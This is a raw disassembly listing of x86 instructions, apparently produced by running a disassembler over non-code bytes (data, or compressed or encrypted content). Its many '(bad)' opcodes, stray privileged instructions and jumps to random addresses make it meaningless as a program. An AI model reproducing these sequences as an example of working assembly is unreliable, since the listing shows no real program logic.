  406f81:	inc    edi
  406f82:	jl     0x406fea
  406f84:	iret   
  406f85:	addr16 daa 
  406f87:	inc    ebx
  406f88:	js     0x406fc7
  406f8a:	ficom  DWORD PTR [edx+ebx*4-0x5a]
  406f8e:	(bad)  
  406f8f:	adc    al,BYTE PTR [ebx+0x76]
  406f92:	addr16 dec ebx
  406f94:	nop
  406f95:	cld    
  406f96:	push   ss
  406f97:	add    bx,WORD PTR [ebp-0x59c6d031]
  406f9e:	push   ss
  406f9f:	mov    esi,0xe428d7a8
  406fa4:	sub    BYTE PTR [esi-0x3d],ch
  406fa7:	push   eax
  406fa8:	fnstcw WORD PTR [esi]
  406faa:	bound  edx,QWORD PTR [edx+edi*4+0x64b52c0b]
  406fb1:	or     cl,BYTE PTR ds:0xbe34e1a7
  406fb7:	stos   BYTE PTR es:[edi],al
  406fb8:	cmp    cl,bl
  406fba:	push   esp
  406fbb:	sbb    esi,DWORD PTR [edx]
  406fbd:	fisubr WORD PTR [esi+0x44]
  406fc0:	(bad)  ds:0x4a60126a
  406fc6:	enter  0xe5ad,0xdd
  406fca:	push   0x6a727698
  406fcf:	ds mov ebx,0xde9645a6
  406fd5:	out    dx,al
  406fd6:	hlt    
  406fd7:	mov    DWORD PTR [ebx+ebx*4+0x3a],ebx
  406fdb:	add    al,0xd3
  406fdd:	test   BYTE PTR [ecx*4+0x25a2621d],0xd3
  406fe5:	fld    TBYTE PTR [eax-0x226e1379]
  406feb:	or     ch,BYTE PTR [ecx+0x67ab9749]
  406ff1:	pop    esp
  406ff2:	call   0x34d9:0xb9b8e4dd
  406ff9:	mov    WORD PTR [ebp+edi*1-0x2f],ds
  406ffd:	aaa    
  406ffe:	or     edx,DWORD PTR [ebx-0x3b90f5e1]
  407004:	jge    0x406f99
  407006:	sub    al,al
  407008:	xor    edx,DWORD PTR [ebx-0x5424517b]
  40700e:	clc    
  40700f:	mov    ds:0xafd7b9,al
  407014:	dec    eax
  407015:	add    DWORD PTR [esi],eax
  407017:	cmp    esp,DWORD PTR ds:0xf87e30b2
  40701d:	div    BYTE PTR ds:0x86431962
  407023:	in     al,0x66
  407025:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407026:	pushf  
  407027:	mov    BYTE PTR [ebx-0x78],al
  40702a:	call   0x9a4e:0x172f792
  407031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407032:	add    DWORD PTR [ecx+0x1e9d9ec],ebp
  407038:	add    eax,0x50b6b39e
  40703d:	add    edx,DWORD PTR [ebp-0x3a553ce6]
  407043:	out    0x7e,al
  407045:	mov    al,0x2f
  407047:	imul   edx,DWORD PTR [esi+0xb7e41f9],0x69db88a
  407051:	stos   DWORD PTR es:[edi],eax
  407052:	push   ds
  407053:	jbe    0x407099
  407055:	sub    ecx,DWORD PTR [eax+eiz*2-0x4f70d88a]
  40705c:	shl    BYTE PTR [ebx],0xf5
  40705f:	lds    esi,FWORD PTR [edi+ecx*2+0x5b10588b]
  407066:	stos   DWORD PTR es:[edi],eax
  407067:	add    BYTE PTR [esi-0x7],bh
  40706a:	popf   
  40706b:	mov    BYTE PTR [eax-0x66e69639],bl
  407071:	scas   al,BYTE PTR es:[edi]
  407072:	sbb    edi,DWORD PTR [ecx]
  407074:	cdq    
  407075:	pop    edi
  407076:	outs   dx,BYTE PTR ds:[esi]
  407077:	xchg   edx,eax
  407078:	mov    edx,0x64fa7b7d
  40707d:	inc    ebx
  40707e:	or     DWORD PTR [eax-0x29ca1c87],ebp
  407084:	jl     0x407083
  407086:	push   esp
  407087:	mov    ecx,gs
  407089:	adc    DWORD PTR [ebp+0x6f25d108],ebx
  40708f:	aaa    
  407090:	mov    dl,0x54
  407092:	data16 stos BYTE PTR es:[edi],al
  407094:	fbld   TBYTE PTR [ebx+eiz*4-0x79]
  407098:	sar    edx,0xa3
  40709b:	retf   
  40709c:	loop   0x4070ea
  40709e:	scas   al,BYTE PTR es:[edi]
  40709f:	and    bh,BYTE PTR [ebx+0x3351ed39]
  4070a5:	pop    eax
  4070a6:	mov    al,ds:0xe068f98e
  4070ab:	loopne 0x40710c
  4070ad:	fimul  WORD PTR [eax+eiz*1-0x1da9e22c]
  4070b4:	xor    DWORD PTR [ebx-0x378efe81],edx
  4070ba:	in     al,dx
  4070bb:	sub    ecx,DWORD PTR [edx]
  4070bd:	fdiv   DWORD PTR [edx]
  4070bf:	jo     0x40704c
  4070c1:	sbb    al,0xd7
  4070c3:	fldenv [ebp+0x31]
  4070c6:	imul   esi,DWORD PTR [ebx],0x19
  4070c9:	or     bh,dl
  4070cb:	xchg   edi,eax
  4070cc:	lock mov dh,0x71
  4070cf:	loopne 0x407067
  4070d1:	dec    edi
  4070d2:	ss icebp 
  4070d4:	sub    ah,ah
  4070d6:	mov    di,0xeddb
  4070da:	mov    ah,0xbc
  4070dc:	mov    ds:0xdd8c2772,eax
  4070e1:	push   cs
  4070e2:	inc    ebx
  4070e3:	rcl    DWORD PTR [edi+0x3d],cl
  4070e6:	push   edi
  4070e7:	cld    
  4070e8:	pop    esp
  4070e9:	fbld   TBYTE PTR [esi+0x2f2f945c]
  4070ef:	mov    ds,WORD PTR [ecx]
  4070f1:	add    al,0xbc
  4070f3:	lea    edx,[eax+ebx*4+0x4c]
  4070f7:	in     eax,dx
  4070f8:	pop    edi
  4070f9:	lods   eax,DWORD PTR ds:[esi]
  4070fa:	outs   dx,DWORD PTR ds:[esi]
  4070fb:	outs   dx,BYTE PTR ds:[esi]
  4070fc:	inc    eax
  4070fd:	test   eax,0x50623efa
  407102:	add    DWORD PTR [edx],ecx
  407104:	mov    ch,0xce
  407106:	ins    BYTE PTR es:[edi],dx
  407107:	mov    eax,0xf2c9a24f
  40710c:	jge    0x4070b7
  40710e:	addr16 push cs
  407110:	inc    ebx
  407111:	clc    
  407112:	and    edx,DWORD PTR [edx+ebx*2+0x660c535d]
  407119:	enter  0xfd33,0xd8
  40711d:	mov    cl,0xf2
  40711f:	mov    ch,0x63
  407121:	push   ebp
  407122:	sub    ecx,0xffffff9a
  407125:	and    edx,DWORD PTR [edi]
  407127:	adc    eax,0xd6214893
  40712c:	div    DWORD PTR [eax]
  40712e:	iret   
  40712f:	js     0x40718f
  407131:	mov    ds:0x37bb61e4,eax
  407136:	xor    DWORD PTR [edx-0x2d114aa6],ecx
  40713c:	pop    esi
  40713d:	stos   BYTE PTR es:[edi],al
  40713e:	leave  
  40713f:	mov    eax,ds:0xfc8d7534
  407144:	pop    esi
  407145:	xlat   BYTE PTR ds:[ebx]
  407146:	dec    ebx
  407147:	and    DWORD PTR [edx],0xdb368d5a
  40714d:	sub    esi,ebp
  40714f:	cmp    BYTE PTR [ebx-0x3e0b1520],al
  407155:	dec    edx
  407156:	adc    esi,DWORD PTR [edi-0x5c30ac2]
  40715c:	stos   BYTE PTR es:[edi],al
  40715d:	mov    ah,0xd2
  40715f:	inc    edi
  407160:	stc    
  407161:	iret   
  407162:	jae    0x40714f
  407164:	sub    al,BYTE PTR [ebx-0x307d009b]
  40716a:	cmp    ah,bl
  40716c:	mov    edx,0xe02fa091
  407171:	les    ebx,FWORD PTR [ebp+0x25e0ed7b]
  407177:	mov    edi,0x122927ad
  40717c:	mov    ebx,0x97c8ef18
  407181:	add    bh,BYTE PTR [ebx+0x5c]
  407184:	loopne 0x407129
  407186:	jmp    0x2cf62264
  40718b:	or     eax,0x96d90abf
  407190:	adc    DWORD PTR [eax],ebp
  407192:	xor    DWORD PTR [edx],esi
  407194:	mov    WORD PTR [ebp+0x7c],ss
  407197:	lds    esi,FWORD PTR [ebp+0x79]
  40719a:	jg     0x4071fb
  40719c:	popa   
  40719d:	xor    dl,dl
  40719f:	push   ecx
  4071a0:	cli    
  4071a1:	jge    0x407135
  4071a3:	jecxz  0x407165
  4071a5:	mov    edi,0x4986e312
  4071aa:	dec    ecx
  4071ab:	sbb    al,0x48
  4071ad:	dec    eax
  4071ae:	cdq    
  4071af:	and    al,0x9
  4071b1:	not    DWORD PTR [edi-0x55a7a50c]
  4071b7:	pop    ss
  4071b8:	retf   
  4071b9:	xor    BYTE PTR [ebx],cl
  4071bb:	sub    eax,0xa3e6e74e
  4071c0:	jae    0x40723e
  4071c2:	mov    edx,0x6a35d2c6
  4071c7:	in     al,dx
  4071c8:	inc    eax
  4071c9:	stc    
  4071ca:	(bad)  
  4071cb:	jp     0x40715c
  4071cd:	inc    cl
  4071cf:	data16 jge 0x407217
  4071d2:	mov    ecx,DWORD PTR [edi-0x70]
  4071d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071d6:	sub    dh,BYTE PTR [edi+0xa2abf01]
  4071dc:	(bad)  
  4071dd:	fcmovne st,st(0)
  4071df:	fisub  WORD PTR [ecx+0x1f]
  4071e2:	imul   ebx
  4071e4:	jb     0x407234
  4071e6:	(bad)  
  4071e7:	popf   
  4071e8:	cmp    eax,0x7b2f8722
  4071ed:	push   edx
  4071ee:	mov    esi,0xb767975c
  4071f3:	je     0x40718d
  4071f5:	xchg   DWORD PTR [edx],ebx
  4071f7:	sbb    ebp,DWORD PTR [edi]
  4071f9:	sub    cl,al
  4071fb:	hlt    
  4071fc:	dec    ebp
  4071fd:	shl    dh,cl
  4071ff:	or     eax,0x7669639d
  407204:	lahf   
  407205:	jmp    0xa700d9b6
  40720a:	mov    eax,0x3a724ebc
  40720f:	mov    cl,0xb1
  407211:	jecxz  0x407196
  407213:	mov    bl,0xc0
  407215:	mov    edi,ebx
  407217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407218:	and    dl,cl
  40721a:	xor    ebx,DWORD PTR [edx+edi*2]
  40721d:	cld    
  40721e:	add    edx,DWORD PTR [edi+0xee4f8d4]
  407224:	or     dh,ch
  407226:	mov    bh,0xca
  407228:	ret    
  407229:	push   ebx
  40722a:	shl    DWORD PTR ds:0xdf5f854c,cl
  407230:	adc    ecx,esp
  407232:	(bad)  
  407233:	lock ins DWORD PTR es:[edi],dx
  407235:	mov    al,0x5c
  407237:	xchg   ecx,eax
  407238:	xchg   esi,eax
  407239:	xor    BYTE PTR cs:[edx+0x31],0x8a
  40723e:	or     DWORD PTR [eax],edx
  407240:	repnz push edi
  407242:	out    dx,al
  407243:	rcl    DWORD PTR [edx-0x4d8ce5e3],0x8f
  40724a:	cmp    ecx,DWORD PTR ds:0xebabfd8b
  407250:	out    dx,al
  407251:	cmp    ebx,ebp
  407253:	xor    al,0x1a
  407255:	fsub   DWORD PTR [ebx+0x6b]
  407259:	stc    
  40725a:	mov    edx,0x1c93e2a8
  40725f:	add    BYTE PTR [edx],bl
  407261:	push   esi
  407262:	cmp    ebp,DWORD PTR [ebp-0x26]
  407265:	mov    edi,0xe5634747
  40726a:	mov    cl,0x2b
  40726c:	popf   
  40726d:	repnz mov ebp,0xe7b7d354
  407273:	mov    ah,0xfb
  407275:	test   al,0x8f
  407277:	iret   
  407278:	ret    
  407279:	cmp    al,0x92
  40727b:	xchg   edx,eax
  40727c:	sbb    DWORD PTR [ebx+0x6c],esi
  40727f:	jle    0x40727b
  407281:	add    eax,0xa509ba51
  407286:	pop    ebp
  407287:	xor    cl,ah
  407289:	out    0x1e,eax
  40728b:	cmp    cl,BYTE PTR [edx]
  40728d:	jp     0x407300
  40728f:	xor    DWORD PTR [eax+0x2],0xffffff96
  407293:	test   DWORD PTR [edi+0x36a844f2],eax
  407299:	int    0x90
  40729b:	ja     0x40727d
  40729d:	jle    0x40723a
  40729f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072a0:	(bad)  
  4072a1:	sbb    DWORD PTR [edx],esp
  4072a3:	push   esi
  4072a4:	xlat   BYTE PTR ds:[ebx]
  4072a5:	fsubr  DWORD PTR [esi]
  4072a7:	les    eax,FWORD PTR [ebx]
  4072a9:	xchg   esp,eax
  4072aa:	mov    dl,0x31
  4072ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072ad:	in     al,dx
  4072ae:	popf   
  4072af:	fst    QWORD PTR [edi+0x36]
  4072b2:	iret   
  4072b3:	xchg   ebp,eax
  4072b4:	jbe    0x407255
  4072b6:	cld    
  4072b7:	lods   al,BYTE PTR cs:[esi]
  4072b9:	rcl    DWORD PTR [ebx-0x5193b195],1
  4072bf:	xchg   esp,eax
  4072c0:	das    
  4072c1:	sub    al,0xcb
  4072c3:	stos   DWORD PTR es:[edi],eax
  4072c4:	fs pop esi
  4072c6:	mov    ecx,DWORD PTR [edi+0x4b9af8a]
  4072cc:	ss (bad) 
  4072ce:	and    edi,ecx
  4072d0:	add    esp,eax
  4072d2:	dec    ecx
  4072d3:	xchg   esp,eax
  4072d4:	jmp    0x407256
  4072d6:	jmp    0x407284
  4072d8:	loope  0x407287
  4072da:	inc    edi
  4072db:	sti    
  4072dc:	jb     0x4072f7
  4072de:	pushf  
  4072df:	xchg   BYTE PTR [esi+esi*2],dl
  4072e2:	push   cs
  4072e3:	fincstp 
  4072e5:	(bad)  
  4072e6:	fs cli 
  4072e8:	sub    dh,BYTE PTR [ebx+0x126c484a]
  4072ee:	sahf   
  4072ef:	adc    ah,BYTE PTR [edi]
  4072f1:	lods   eax,DWORD PTR ds:[esi]
  4072f2:	mov    al,ds:0x8dfd4c81
  4072f7:	push   eax
  4072f8:	mov    bh,0x2f
  4072fa:	adc    ebx,esp
  4072fc:	xchg   ebp,eax
  4072fd:	cli    
  4072fe:	repnz div DWORD PTR ds:[esi+0x6eb1d05c]
  407306:	inc    ecx
  407307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407308:	adc    BYTE PTR [ebp+0x5a],dl
  40730b:	sbb    BYTE PTR [edi],ch
  40730d:	(bad)  
  40730e:	jnp    0x407316
  407310:	dec    esp
  407311:	mov    ebp,0xf84ba2f6
  407316:	test   BYTE PTR [edx-0x31],cl
  407319:	or     eax,0xc52e9b9a
  40731e:	sbb    ecx,edx
  407320:	call   0xf5bbf7c7
  407325:	(bad)  
  407326:	call   0xed84b458
  40732b:	in     al,dx
  40732c:	shl    DWORD PTR [ecx+ebp*2],0x1b
  407330:	pushf  
  407331:	mov    dh,ah
  407333:	loop   0x40737d
  407335:	aas    
  407336:	inc    ebp
  407337:	enter  0x3032,0xc1
  40733b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40733c:	xor    DWORD PTR [edx-0x641617d0],0xffffff8c
  407343:	dec    ebp
  407344:	aas    
  407345:	mov    bl,0xc2
  407347:	cmp    BYTE PTR [ecx+0x24bee666],cl
  40734d:	jecxz  0x4072df
  40734f:	mov    DWORD PTR [edi+eax*1],esp
  407352:	repz mov edx,0x37178250
  407358:	stos   DWORD PTR es:[edi],eax
  407359:	pop    ss
  40735a:	push   ss
  40735b:	lds    ebx,FWORD PTR [edi+0x61f440d7]
  407361:	pop    esi
  407362:	nop
  407363:	pop    ds
  407364:	mov    bh,BYTE PTR ss:[ecx-0x7d1252f5]
  40736b:	stc    
  40736c:	mov    dh,0x6c
  40736e:	and    BYTE PTR [ebx+edx*8],dl
  407371:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407372:	sub    edi,ebp
  407374:	repz fwait
  407376:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407377:	(bad)  
  407378:	arpl   WORD PTR [esp+ebx*1-0x389f4b1f],ax
  40737f:	inc    esp
  407380:	fbld   TBYTE PTR [edx]
  407382:	sar    BYTE PTR [edi],1
  407384:	sub    DWORD PTR [edi+0x6f],edi
  407387:	jecxz  0x407318
  407389:	mov    bl,0xfa
  40738b:	push   ds
  40738c:	pop    esi
  40738d:	mov    bh,0xf2
  40738f:	fs jmp 0x20110fb8
  407395:	fdivr  QWORD PTR [esi+0x19bcad92]
  40739b:	push   0x9e822fdd
  4073a0:	push   eax
  4073a1:	xor    BYTE PTR [ebx],0xf6
  4073a4:	jbe    0x407420
  4073a6:	dec    esi
  4073a7:	pop    edi
  4073a8:	fld    TBYTE PTR [ebx-0x4ecfb719]
  4073ae:	mov    eax,0xf2b2e0ad
  4073b3:	rol    BYTE PTR [edi+0x6854f52c],cl
  4073b9:	jle    0x407436
  4073bb:	sbb    esi,DWORD PTR [edx-0x64f1c8]
  4073c1:	es icebp 
  4073c3:	aaa    
  4073c4:	jnp    0x4073b0
  4073c6:	jnp    0x4073e1
  4073c8:	call   0x10c44b57
  4073cd:	mov    ecx,0xb1956b5a
  4073d2:	mov    ds:0x333e8281,eax
  4073d7:	cwde   
  4073d8:	pop    edx
  4073d9:	sbb    al,0xba
  4073db:	jmp    0x4073c2
  4073dd:	xchg   ebp,eax
  4073de:	int    0xc8
  4073e0:	adc    BYTE PTR [ecx-0x2603e82b],ch
  4073e6:	popf   
  4073e7:	mov    ebp,0x77fbcc2e
  4073ec:	dec    edi
  4073ed:	pop    ss
  4073ee:	jmp    0xa45b2acb
  4073f3:	adc    esp,DWORD PTR [edi]
  4073f5:	cld    
  4073f6:	(bad)  [edi-0x37]
  4073f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073fa:	icebp  
  4073fb:	jecxz  0x407465
  4073fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073fe:	into   
  4073ff:	mov    DWORD PTR [ecx+0x10],eax
  407402:	mov    eax,eax
  407404:	jmp    0x40790f
  407409:	(bad)  
  40740a:	int    0xd3
  40740c:	rcr    bl,cl
  40740e:	rol    ch,cl
  407410:	fxch   st(2)
  407412:	cmp    eax,0x2442cccd
  407417:	leave  
  407418:	mov    ah,0xa6
  40741a:	fstp   TBYTE PTR [eax+0x78]
  40741d:	push   0x7c
  40741f:	js     0x407499
  407421:	adc    DWORD PTR [esi-0x7937633e],esp
  407427:	push   0x73
  407429:	outs   dx,DWORD PTR ds:[esi]
  40742a:	xchg   al,bl
  40742c:	ds dec esp
  40742e:	or     eax,0x61f91ae8
  407433:	adc    eax,0x37bbacf5
  407438:	or     edx,ebp
  40743a:	cmc    
  40743b:	in     al,dx
  40743c:	jo     0x407421
  40743e:	mov    dh,0xc9
  407440:	enter  0x9836,0x18
  407444:	add    BYTE PTR [ebx+eax*2-0xd],ah
  407448:	inc    edx
  407449:	lods   al,BYTE PTR ds:[esi]
  40744a:	jo     0x407441
  40744c:	jle    0x40746d
  40744e:	adc    eax,0x2df585f8
  407453:	mov    ebx,DWORD PTR [esi]
  407455:	out    0xad,eax
  407457:	or     BYTE PTR [eax-0x40],0xc9
  40745b:	out    0x72,eax
  40745d:	push   0xffffffdc
  40745f:	ss jecxz 0x407404
  407462:	lahf   
  407463:	mov    edi,0x389e40d6
  407468:	popa   
  407469:	adc    al,0x6a
  40746b:	jae    0x407478
  40746d:	test   BYTE PTR ds:[esi],ah
  407470:	out    0x64,al
  407472:	cmp    esp,DWORD PTR [ebx+ebx*8-0x5aa4726a]
  407479:	imul   eax,ebp,0xf085eaf9
  40747f:	push   edi
  407480:	mov    cl,0x40
  407482:	lea    eax,[edi]
  407484:	mov    DWORD PTR [ecx],esi
  407486:	imul   BYTE PTR [eax+0x6f]
  407489:	pop    eax
  40748a:	mov    WORD PTR [eax],fs
  40748c:	fcomp  st(1)
  40748e:	sub    esi,0x9dd74d79
  407494:	fstp   TBYTE PTR [edi-0x3d]
  407497:	aam    0x12
  407499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40749a:	outs   dx,BYTE PTR ds:[esi]
  40749b:	rcr    BYTE PTR [esi-0x50],1
  40749e:	loop   0x407451
  4074a0:	fist   WORD PTR [ebx]
  4074a2:	es push eax
  4074a4:	sbb    al,0x2c
  4074a6:	jb     0x4074b9
  4074a8:	xor    eax,DWORD PTR [ecx]
  4074aa:	fild   WORD PTR [edi-0x2e6656a2]
  4074b0:	pop    ebp
  4074b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074b2:	loope  0x407471
  4074b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074b5:	test   al,0x7d
  4074b7:	and    BYTE PTR [ecx+0x6b],bh
  4074ba:	cmp    DWORD PTR [ebp+esi*4+0x74],esp
  4074be:	xchg   ecx,eax
  4074bf:	mov    edi,0x2aaa9d55
  4074c4:	cmp    al,0x51
  4074c6:	call   0x7eb5ee59
  4074cb:	cmp    eax,0x71ade570
  4074d0:	fwait
  4074d1:	(bad)  
  4074d2:	test   DWORD PTR [ebp+0x16b16a78],ecx
  4074d8:	dec    edx
  4074d9:	push   ss
  4074da:	or     bl,BYTE PTR [esi-0x46c5f6f3]
  4074e0:	out    0xd0,al
  4074e2:	aam    0xb8
  4074e4:	js     0x407492
  4074e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074e7:	mov    edi,0x9ad76ed
  4074ec:	mov    al,ds:0xc1e02c75
  4074f1:	sbb    bl,BYTE PTR [eax-0x62d75572]
  4074f7:	retf   0x8326
  4074fa:	and    edx,DWORD PTR [ebp+0x7a1b91ca]
  407500:	or     dl,ch
  407502:	(bad)  
  407503:	adc    dh,dl
  407505:	in     al,0x44
  407507:	push   edx
  407508:	pop    ecx
  407509:	fs pop ds
  40750b:	ja     0x407542
  40750d:	dec    esi
  40750e:	or     BYTE PTR ds:0x915cd26,ch
  407514:	adc    al,0x9f
  407516:	or     eax,0xbd0c5bf2
  40751b:	jno    0x407586
  40751d:	pop    eax
  40751e:	pop    esp
  40751f:	aad    0x6f
  407521:	into   
  407522:	or     eax,0x1417868d
  407527:	jmp    0x4074ca
  407529:	iret   
  40752a:	inc    ebp
  40752b:	adc    al,BYTE PTR [eax]
  40752d:	or     al,0x3f
  40752f:	ror    ecx,0x9c
  407532:	loope  0x4074ed
  407534:	jno    0x4074e5
  407536:	adc    BYTE PTR [esp+eax*2-0x7],0x9e
  40753b:	mov    al,0xf2
  40753d:	sbb    esi,esi
  40753f:	clc    
  407540:	(bad)  
  407541:	fidivr DWORD PTR [ecx+0x69]
  407544:	jb     0x4075a6
  407546:	jns    0x407521
  407548:	test   edx,esi
  40754a:	mov    eax,ds:0x1d002b96
  40754f:	fild   WORD PTR [edx+0x5f]
  407553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407554:	or     BYTE PTR [ebp+eiz*2+0x48],0x4e
  407559:	cmp    eax,0x7675b378
  40755e:	push   0x50
  407560:	or     bl,BYTE PTR [ecx-0x653e8fad]
  407566:	add    al,0x5f
  407568:	popf   
  407569:	sub    dh,BYTE PTR [ebx+0x33]
  40756c:	push   esp
  40756d:	scas   eax,DWORD PTR es:[edi]
  40756e:	jne    0x4075d7
  407570:	fdiv   QWORD PTR [ebp+0x13]
  407573:	lods   eax,DWORD PTR ds:[esi]
  407574:	imul   ecx,DWORD PTR [ecx-0x5aaf0f36],0xffffffa8
  40757b:	xchg   edi,eax
  40757c:	and    eax,0xa14813d0
  407581:	jl     0x4075a0
  407583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407584:	adc    al,0x24
  407586:	ins    DWORD PTR es:[edi],dx
  407587:	lods   eax,DWORD PTR ds:[esi]
  407588:	sub    eax,0x5a4ca0f3
  40758d:	jp     0x4075e9
  40758f:	enter  0x5b9b,0xd2
  407593:	fs icebp 
  407595:	inc    esp
  407596:	retf   
  407597:	icebp  
  407598:	sub    BYTE PTR [eax-0x17],bh
  40759b:	xchg   esi,eax
  40759c:	stos   BYTE PTR es:[edi],al
  40759d:	sub    eax,0x9f08b099
  4075a2:	loope  0x40761f
  4075a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075a5:	inc    eax
  4075a6:	mov    bh,0x68
  4075a8:	adc    DWORD PTR [edx-0x317a693b],edx
  4075ae:	mov    eax,ds:0x5ca35b11
  4075b3:	push   es
  4075b4:	sbb    al,bh
  4075b6:	outs   dx,BYTE PTR ds:[esi]
  4075b7:	fimul  WORD PTR [esi-0xb]
  4075ba:	mov    ah,0x9b
  4075bc:	es cli 
  4075be:	ret    
  4075bf:	adc    eax,0xbf055168
  4075c4:	cdq    
  4075c5:	mov    edi,0xf1f14b08
  4075ca:	adc    esp,DWORD PTR [ecx]
  4075cc:	in     al,0x6c
  4075ce:	adc    DWORD PTR [eax],edi
  4075d0:	jecxz  0x4075d7
  4075d2:	sub    DWORD PTR [edx-0x31978be5],0x63
  4075d9:	lea    ax,[ebx+0x7d]
  4075dd:	fisubr WORD PTR [edi]
  4075df:	stc    
  4075e0:	inc    esi
  4075e1:	ss stc 
  4075e3:	jmp    0x89b2ef9a
  4075e8:	jo     0x407585
  4075ea:	sbb    eax,0x40bc5332
  4075ef:	or     eax,DWORD PTR [ebx-0xc1c826d]
  4075f5:	xor    ah,dl
  4075f7:	lods   eax,DWORD PTR ds:[esi]
  4075f8:	sar    DWORD PTR [ebx-0x5294de8f],0xfe
  4075ff:	pop    eax
  407600:	pop    ecx
  407601:	push   0x4ec34ca8
  407606:	cmp    al,BYTE PTR [eax]
  407608:	mov    bl,0x3b
  40760a:	pop    ecx
  40760b:	mov    es,WORD PTR es:[edi]
  40760e:	aad    0x67
  407610:	mov    al,0x2
  407612:	loope  0x407612
  407614:	lea    ecx,[ebx-0x49ca1a1d]
  40761a:	mov    ds:0x279c1a17,eax
  40761f:	and    BYTE PTR [ebp-0x6f],dl
  407622:	mov    al,ds:0xb3860b18
  407627:	dec    eax
  407628:	push   0xd0696f47
  40762d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40762e:	imul   ebp,edx,0xa4de6ec1
  407634:	into   
  407635:	jp     0x4076a7
  407637:	pushf  
  407638:	clc    
  407639:	daa    
  40763a:	retf   0xff6a
  40763d:	jns    0x4075fb
  40763f:	lods   eax,DWORD PTR ds:[esi]
  407640:	inc    ebp
  407641:	xchg   ebx,eax
  407642:	xchg   DWORD PTR [ecx],edi
  407644:	adc    dh,bh
  407646:	js     0x4075db
  407648:	aaa    
  407649:	(bad)  
  40764a:	cmp    esp,DWORD PTR [edi-0x4e]
  40764d:	fistp  QWORD PTR [edi-0xa]
  407650:	cld    
  407651:	xor    edx,DWORD PTR [ebx+0x537eeef1]
  407657:	rol    DWORD PTR [edi-0x69],0x4e
  40765b:	cwde   
  40765c:	fcmovu st,st(3)
  40765e:	cs xor al,0xbc
  407661:	cmp    al,BYTE PTR [ebx+0x5e]
  407664:	int3   
  407665:	mov    edx,0xd4443baf
  40766a:	leave  
  40766b:	stos   DWORD PTR es:[edi],eax
  40766c:	mov    ebx,0xa36cbb58
  407671:	icebp  
  407672:	shl    BYTE PTR [ebx+ebx*8],1
  407675:	mov    bl,BYTE PTR [esi+0x2d97e39c]
  40767b:	leave  
  40767c:	rcr    DWORD PTR [esi],cl
  40767e:	and    al,0xef
  407680:	cmp    ecx,DWORD PTR [ebp-0x1b]
  407683:	retf   0x2768
  407686:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407688:	pop    edi
  407689:	sbb    cl,al
  40768b:	jmp    0x34eb7d9e
  407690:	retf   0x9b4b
  407693:	(bad)  
  407694:	(bad)  
  407695:	icebp  
  407696:	push   edx
  407697:	mov    ah,0xbc
  407699:	sub    eax,0x11a519a2
  40769e:	test   edi,eax
  4076a0:	cmp    DWORD PTR [ecx-0xa33058d],ecx
  4076a6:	shl    DWORD PTR ds:[eax],cl
  4076a9:	arpl   dx,sp
  4076ab:	and    ch,cl
  4076ad:	outs   dx,DWORD PTR ds:[esi]
  4076ae:	int3   
  4076af:	outs   dx,BYTE PTR ds:[esi]
  4076b0:	aam    0x78
  4076b2:	jno    0x40764f
  4076b4:	jmp    0xa56db8d4
  4076b9:	in     eax,dx
  4076ba:	adc    al,0x1e
  4076bc:	lock jle 0x407734
  4076bf:	nop
  4076c0:	fdivr  DWORD PTR [ebx]
  4076c2:	aam    0xa9
  4076c4:	enter  0x1fd0,0xd
  4076c8:	lds    edx,FWORD PTR [eax+0x30d4f525]
  4076ce:	in     al,dx
  4076cf:	sbb    DWORD PTR [esi-0x40],edi
  4076d2:	in     eax,dx
  4076d3:	mov    ch,0x4d
  4076d5:	cmc    
  4076d6:	xchg   bl,al
  4076d8:	pop    ds
  4076d9:	pop    ebp
  4076da:	sub    al,0x37
  4076dc:	mov    eax,0xfdf735a1
  4076e1:	push   esp
  4076e2:	pop    ebx
  4076e3:	adc    eax,0x8dc6e973
  4076e8:	test   al,0x49
  4076ea:	push   edi
  4076eb:	xlat   BYTE PTR ds:[ebx]
  4076ec:	xor    ebp,DWORD PTR [eax+0x6c199fa]
  4076f2:	push   ecx
  4076f3:	ret    0xee92
  4076f6:	mov    al,ds:0x4a6c0b9a
  4076fb:	jae    0x407685
  4076fd:	arpl   WORD PTR [eax+0x717e704d],cx
  407703:	mov    BYTE PTR [ebx],cl
  407705:	ficom  WORD PTR [edi-0x59]
  407708:	daa    
  407709:	popa   
  40770a:	jbe    0x407737
  40770c:	push   ss
  40770d:	add    eax,0x3ff8820e
  407712:	outs   dx,DWORD PTR ds:[esi]
  407713:	les    ecx,FWORD PTR [eax+eiz*1-0xf06c703]
  40771a:	push   edi
  40771b:	mov    bh,0x2a
  40771d:	ret    
  40771e:	push   0x65364bc
  407723:	and    al,0x77
  407725:	add    al,BYTE PTR [edi-0x43c5bede]
  40772b:	in     al,dx
  40772c:	jo     0x40776c
  40772e:	xchg   ebp,eax
  40772f:	data16 or BYTE PTR ds:0xffc41c73,bl
  407736:	popa   
  407737:	jns    0x407749
  407739:	pop    ebp
  40773a:	jmp    0x910c0b87
  40773f:	loope  0x407707
  407741:	jnp    0x4077be
  407743:	inc    edx
  407744:	mov    BYTE PTR [edx-0xeb76074],dh
  40774a:	sbb    edx,DWORD PTR [ebx-0x722a8178]
  407750:	adc    bl,dh
  407752:	dec    ebx
  407753:	mov    bl,cl
